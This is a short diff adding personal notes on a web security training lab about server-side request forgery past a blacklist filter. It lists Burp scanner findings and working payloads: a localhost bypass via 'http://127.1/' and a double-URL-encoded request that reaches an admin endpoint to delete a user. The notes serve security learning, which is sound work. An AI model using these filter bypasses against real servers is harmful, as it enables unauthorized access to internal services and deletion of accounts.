@@ -1,0 +1,15 @@
+Lab: SSRF with blacklist-based input filter
+
+skaner burp:
+
+Out-of-band resource load
+External service interaction
+
+original:
+stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+
+local host  filter bypass
+stockApi=http://127.1/
+
+admin panel bypass - a doube URL encoding
+stockApi=http://127.1/%2561dmin/delete?username=carlos
